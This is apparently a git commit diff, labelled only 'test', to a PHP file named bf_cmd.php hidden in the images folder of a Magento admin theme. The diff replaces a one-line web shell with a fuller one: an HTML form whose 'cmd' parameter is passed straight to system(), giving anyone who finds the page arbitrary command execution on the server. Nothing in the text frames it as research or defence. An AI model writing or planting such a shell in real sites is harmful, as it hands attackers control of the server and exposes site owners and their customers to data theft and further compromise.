d93c5ab73eafd48842b67afdfef759c539d72ee6
root <root@localhost.localdomain>
2021-08-30 19:12:31 -0500

    test

--- app/design/adminhtml/Magento/backend/web/images/bf_cmd.php
+++ app/design/adminhtml/Magento/backend/web/images/bf_cmd.php
@@ -1,1 +1,16 @@
-<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
